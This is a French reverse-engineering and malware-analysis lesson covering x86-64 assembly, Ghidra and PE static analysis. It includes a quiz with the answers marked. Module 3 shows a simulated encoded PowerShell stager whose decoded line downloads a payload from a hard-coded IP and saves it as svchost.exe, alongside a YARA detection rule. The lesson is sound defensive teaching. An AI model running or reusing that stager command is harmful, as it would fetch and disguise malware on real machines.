# TOME P10 — DFIR & Reverse Engineering — Jour 446 (6h) : Introduction au Reverse Engineering (Architecture x86-64, Assembleur & Analyse Statique avec Ghidra)

> [!NOTE]
> **Objectifs pédagogiques :**
> - Maîtriser l'**architecture processeur x86-64** : registres, conventions d'appel, pile et calling conventions (System V ABI / Microsoft x64)
> - Lire et interpréter du code **assembleur x86-64** dans un contexte de sécurité (malware/exploit analysis)
> - Utiliser **Ghidra** (NSA) pour le désassemblage, la décompilation et l'annotation de binaires
> - Conduire une première **analyse statique** d'un binaire suspect : strings, imports, entropie, sections PE
>
> **Compétences visées :** `SEC-06` (A) — Reverse Engineering, `SEC-05` (A) — Malware Analysis

---

## Module 1 — Architecture x86-64 & Assembleur pour le RE (2h)

### 📖 Intuition & Narration

Chaque programme que vous exécutez — votre navigateur, votre application bancaire, ce malware que vous analysez — se réduit finalement à des instructions binaires que le processeur exécute une par une. Le **Reverse Engineering** (RE) consiste à remonter de ces instructions binaires vers une compréhension fonctionnelle du programme. C'est l'art de lire la machine dans sa langue natale : l'assembleur.

Un analyste RE face à un binaire inconnu est comme un archéologue déchiffrant une tablette cunéiforme : chaque instruction est un glyphe, et la structure du code révèle les intentions du créateur.

### 🔍 Anatomie Technique — Registres x86-64

```
REGISTRES x86-64 — RÉFÉRENCE COMPLÈTE

  REGISTRES GÉNÉRAUX (64-bit / 32-bit / 16-bit / 8-bit)
  ┌────────┬────────┬──────┬────┬────┬───────────────────────────┐
  │  rax   │  eax   │  ax  │ ah │ al │  Accumulateur (return val)│
  │  rbx   │  ebx   │  bx  │ bh │ bl │  Base register            │
  │  rcx   │  ecx   │  cx  │ ch │ cl │  Counter (boucles)        │
  │  rdx   │  edx   │  dx  │ dh │ dl │  Data (mul/div)           │
  │  rsi   │  esi   │  si  │    │sil │  Source Index             │
  │  rdi   │  edi   │  di  │    │dil │  Destination Index        │
  │  rsp   │  esp   │  sp  │    │spl │  Stack Pointer ⚠️         │
  │  rbp   │  ebp   │  bp  │    │bpl │  Base Pointer (frame)     │
  │  r8-r15│ r8d-15d│r8w-15w│  │r8b │  Registres additionnels   │
  └────────┴────────┴──────┴────┴────┴───────────────────────────┘

  REGISTRES SPÉCIAUX
  ├── rip  : Instruction Pointer (adresse prochaine instruction)
  ├── rflags : Flags (ZF=Zero, SF=Sign, CF=Carry, OF=Overflow)
  └── xmm0-xmm15 : Registres SSE (128-bit, float/SIMD)

CALLING CONVENTIONS — PASSAGE D'ARGUMENTS

  System V ABI (Linux/macOS x86-64) :
  │  Arg 1  │  rdi
  │  Arg 2  │  rsi
  │  Arg 3  │  rdx
  │  Arg 4  │  rcx
  │  Arg 5  │  r8
  │  Arg 6  │  r9
  │  Arg 7+ │  Stack (push ordre inverse)
  │  Return │  rax

  Microsoft x64 ABI (Windows) :
  │  Arg 1  │  rcx
  │  Arg 2  │  rdx
  │  Arg 3  │  r8
  │  Arg 4  │  r9
  │  Arg 5+ │  Stack
  │  Return │  rax
```

### 🔍 Anatomie Technique — Instructions x86-64 Essentielles

```asm
; ══════════════════════════════════════════════════════
; INSTRUCTIONS x86-64 FONDAMENTALES POUR LE RE
; ══════════════════════════════════════════════════════

; TRANSFERT DE DONNÉES
mov rax, rbx        ; rax = rbx (copie)
mov rax, [rbp-8]    ; rax = *(rbp-8) (lecture mémoire)
mov [rbp-8], rax    ; *(rbp-8) = rax (écriture mémoire)
lea rax, [rbp-0x20] ; rax = adresse de rbp-0x20 (Load Effective Address)
push rbp            ; rsp -= 8; *rsp = rbp (sauvegarde sur pile)
pop  rbp            ; rbp = *rsp; rsp += 8 (restauration pile)

; ARITHMÉTIQUE
add  rax, 0x10      ; rax += 16
sub  rsp, 0x28      ; rsp -= 40 (allocation frame de pile)
imul rax, rcx       ; rax = rax * rcx (multiplication signée)
xor  eax, eax       ; eax = 0 (idiome : mise à zéro rapide)
inc  rcx            ; rcx += 1
dec  rcx            ; rcx -= 1

; COMPARAISON & SAUTS
cmp rax, 0          ; Flags = rax - 0 (sans stocker le résultat)
test rax, rax       ; Flags = rax & rax (teste si rax == 0)
jz  label           ; Saut si ZF=1 (rax == 0)
jnz label           ; Saut si ZF=0 (rax != 0)
jl  label           ; Saut si résultat < 0 (signé)
jmp label           ; Saut inconditionnel

; APPELS DE FONCTIONS
call    printf      ; push rip; jmp printf (appel de fonction)
ret                 ; pop rip (retour de fonction)

; LECTURE/ÉCRITURE SYSCALL (Linux)
mov rax, 1          ; syscall numéro 1 = write
mov rdi, 1          ; fd = stdout
lea rsi, [msg]      ; buffer = adresse du message
mov rdx, 13         ; len = 13 bytes
syscall             ; appel kernel
```

### 🛠️ Atelier Pratique — Lecture d'un Programme Simple en Assembleur

```asm
; Fonction C : int add(int a, int b) { return a + b; }
; Compilée avec gcc -O0 pour x86-64 Linux

add:
    push   rbp              ; Sauvegarde frame pointer
    mov    rbp, rsp         ; Nouveau frame = sommet de pile
    mov    DWORD PTR [rbp-0x4], edi   ; a = arg1 (edi = 32-bit de rdi)
    mov    DWORD PTR [rbp-0x8], esi   ; b = arg2 (esi = 32-bit de rsi)
    mov    eax, DWORD PTR [rbp-0x4]  ; eax = a
    add    eax, DWORD PTR [rbp-0x8]  ; eax = a + b
    pop    rbp              ; Restaure frame pointer
    ret                     ; Retourne (rax contient a+b)
```

---

## Module 2 — Analyse Statique avec Ghidra (NSA) (2h)

### 📖 Intuition & Narration

**Ghidra** est l'outil de reverse engineering open-source développé et publié par la NSA en 2019. Il est aujourd'hui l'un des deux outils de référence mondiale pour l'analyse de binaires, aux côtés d'IDA Pro (commercial). Sa force : un **décompilateur** intégré qui reconstruit du pseudo-code C lisible depuis le binaire x86-64.

### 🛠️ Atelier Pratique — Workflow Analyse Statique

```bash
# ══════════════════════════════════════════════════════
# PRÉ-ANALYSE STATIQUE AVANT GHIDRA (PHASE 1)
# Informations sur le binaire sans l'exécuter
# ══════════════════════════════════════════════════════

BINARY="suspect.exe"

# 1. Identification du format et de l'architecture
file $BINARY
# → PE32+ executable (console) x86-64, Windows

# 2. Strings lisibles dans le binaire
strings $BINARY | grep -E "http|cmd|powershell|reg|HKEY|password|key"

# 3. Entropie des sections PE (haute entropie = packing/chiffrement)
# Outil : python-pefile
python3 -c "
import pefile
pe = pefile.PE('$BINARY')
for section in pe.sections:
    name = section.Name.decode().rstrip('\x00')
    ent = section.get_entropy()
    print(f'{name:12} entropy={ent:.2f} size={section.SizeOfRawData}')
    if ent > 7.0:
        print(f'  ⚠️  HAUTE ENTROPIE — Probable packing/chiffrement')
"

# 4. Imports DLL (fonctions Windows API appelées)
python3 -c "
import pefile
pe = pefile.PE('$BINARY')
if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        dll = entry.dll.decode()
        print(f'\n[{dll}]')
        for imp in entry.imports:
            if imp.name:
                print(f'  {imp.name.decode()}')
"

# Imports suspects typiques :
# CreateRemoteThread    → Injection de code
# VirtualAllocEx        → Allocation mémoire distante (injection)
# WriteProcessMemory    → Écriture dans processus distant
# WinExec, ShellExecute → Exécution de commandes
# InternetOpenA/W       → Connexion réseau (HTTP)
# CryptDecrypt          → Déchiffrement (obfuscation)

# 5. Calcul d'imphash (fingerprinting par imports)
python3 -c "
import pefile
pe = pefile.PE('$BINARY')
print('imphash:', pe.get_imphash())
"
# Chercher l'imphash sur VirusTotal / MalwareBazaar
```

### 🔍 Anatomie Technique — Workflow Ghidra

```
WORKFLOW GHIDRA — ANALYSE D'UN BINAIRE SUSPECT

  1. IMPORT
     File → Import File → suspect.exe
     Ghidra détecte automatiquement : PE, x86-64, Little Endian

  2. ANALYSE AUTOMATIQUE
     Clic "Yes" sur "Analyze Now?" → Analyse ~30-60 secondes
     ✅ Désassemblage, détection de fonctions, décompilation

  3. NAVIGATION CLÉS
     Symbol Tree      → Fonctions, imports, exports
     Listing (ASM)    → Code assembleur désassemblé
     Decompiler       → Pseudo-code C reconstitué
     Data Type Manager → Types de données identifiés

  4. ANNOTATION MANUELLE
     Renommer les fonctions (F2) : func_00401234 → decrypt_payload
     Renommer les variables : param_1 → encryption_key
     Créer des structures de données sur les pointeurs
     Ajouter des commentaires (;)

  5. RECHERCHE D'ARTEFACTS MALVEILLANTS
     Search → For Strings → chercher "http", "cmd", "/c", "powershell"
     Search → For Instructions → patterns shellcode (xor eax,eax / jmp esp)
     Cross-references (X) → Qui appelle cette fonction ? Qui utilise cette chaîne ?
```

---

## Module 3 — Analyse d'un Malware Simple : Stager PowerShell (1h30)

### 🛠️ Atelier Pratique — Déobfuscation de Stager

```bash
# ══════════════════════════════════════════════════════
# ANALYSE D'UN STAGER POWERSHELL OBFUSQUÉ (simulé)
# Technique courante dans les malwares document-based
# ══════════════════════════════════════════════════════

# Stager obfusqué typique extrait d'un macro VBA :
OBFUSCATED='powershell -e JABzACAAPQAgACcAaAB0AHQAcABzADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQANwAvAHAAYQB5AGwAbwBhAGQAJwA7AEkAVwBSACAAJABzACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUA'

# Décodage Base64 de la partie après "-e"
echo "JABzACAAPQAgACcAaAB0AHQAcABzADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQANwAvAHAAYQB5AGwAbwBhAGQAJwA7AEkAVwBSACAAJABzACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUA" | base64 -d
# → $s = 'https://185.220.101.47/payload'; IWR $s -OutFile $env:TEMP\svchost.exe

# ══════════════════════════════════════════════════════
# ANALYSE AVEC STRINGS + YARA RULES
# ══════════════════════════════════════════════════════

# Règle YARA pour détecter ce type de stager
cat > /tmp/powershell_stager.yar << 'EOF'
rule PowerShell_Encoded_Stager {
    meta:
        description = "Detects PowerShell encoded command stager"
        author = "PARADIS DFIR Team"
        severity = "high"

    strings:
        $ps_enc    = "powershell" nocase ascii wide
        $enc_flag  = " -e " nocase ascii
        $enc_flag2 = " -en " nocase ascii
        $enc_flag3 = " -enc " nocase ascii
        $iwr       = "IWR" nocase ascii wide
        $invoke    = "Invoke-WebRequest" nocase ascii wide

    condition:
        $ps_enc and ($enc_flag or $enc_flag2 or $enc_flag3) and
        ($iwr or $invoke)
}
EOF

# Scanner un dossier avec YARA
yara /tmp/powershell_stager.yar /tmp/suspect_files/ -r
```

### 🚑 Terrain — Retour d'Expérience

**Cas : Analyse d'un dropper LockBit 3.0 avec Ghidra (2024)**

Un analyste RE reçoit le dropper d'un ransomware LockBit 3.0. Analyse statique initiale :
- **Entropie section `.text` : 7.82** → Forte probabilité de packing (UPX ou custom packer)
- **Imports minimaux :** `VirtualAlloc`, `VirtualProtect`, `CreateThread` → Classic unpacking stub
- **Strings :** Aucune chaîne lisible → tout est chiffré en mémoire (obfuscation runtime)

Décompilation Ghidra de `main()` : identifie une boucle XOR avec clé 4 bytes déchiffrant une table de strings → extraction de la clé XOR et déchiffrement offline de 47 chaînes : URLs C2, extension de chiffrement `.lockbit3`, clé publique RSA-4096.

---

## Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **RE** | Reverse Engineering — Analyse d'un programme compilé pour en comprendre le fonctionnement sans avoir le code source |
| **ABI** | Application Binary Interface — Convention de bas-niveau définissant le passage d'arguments et l'organisation de la pile |
| **PE** | Portable Executable — Format de fichier exécutable Windows (.exe, .dll) |
| **Imphash** | Import Hash — Hash MD5 des noms de fonctions importées, utilisé pour fingerprinter les familles de malwares |
| **YARA** | Yet Another Recursive Acronym — Langage de règles pour la détection et classification de malwares par patterns |

---

## Exercices Pratiques

### Exercice 1 — Lecture d'un prologue de fonction

**Question :** Que fait ce prologue de fonction en assembleur x86-64 ?
```asm
push rbp
mov  rbp, rsp
sub  rsp, 0x30
```

**Corrigé guidé :** C'est le prologue standard d'une fonction compilée sans optimisation : (1) sauvegarde le frame pointer parent, (2) crée un nouveau frame pointer au sommet de pile actuel, (3) alloue 48 bytes (0x30) de variables locales sur la pile. Correspond à `void func() { char buf[48]; ... }`.

### Exercice 2 — Identification de la calling convention

Dans une fonction Linux x86-64, avant un `call malloc`, vous voyez `mov edi, 0x1000`. Que cela signifie-t-il ?

**Corrigé guidé :** Selon la System V ABI Linux, le premier argument est passé dans `rdi` (32-bit : `edi`). La valeur `0x1000` = 4096 octets. Donc l'instruction équivaut à `malloc(4096)` en C.

---

## Banque QCM — 5 Questions

**Q1.** Sous Linux x86-64 (System V ABI), la valeur de retour d'une fonction est placée dans :

- A) rbp
- B) rsp
- C) rax ✅
- D) rdi

**Q2.** Une section PE avec une entropie de Shannon > 7.0 indique généralement :

- A) Un exécutable correctement compilé avec debug symbols
- B) Du code obfusqué, packé ou chiffré ✅
- C) Un fichier PNG correctement compressé
- D) Un binaire optimisé sans sections inutiles

**Q3.** L'instruction assembleur `xor eax, eax` est équivalente en C à :

- A) `eax ^= 0xFF;`
- B) `eax = eax;` (no-op)
- C) `eax = 0;` ✅ (idiome zero-register)
- D) `eax = ~eax;`

**Q4.** L'**imphash** d'un exécutable PE est calculé à partir de :

- A) Le hash SHA-256 de l'ensemble du fichier binaire
- B) Les noms des fonctions importées et leur DLL, triés et hashés en MD5 ✅
- C) L'entropie combinée de toutes les sections
- D) Le timestamp de compilation dans l'en-tête PE

**Q5.** Dans Ghidra, la vue **Decompiler** permet de :

- A) Exécuter le binaire dans un sandbox virtuel
- B) Reconstituer du pseudo-code C lisible depuis le binaire x86-64 ✅
- C) Patcher directement les octets du binaire
- D) Analyser le trafic réseau généré par le binaire

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
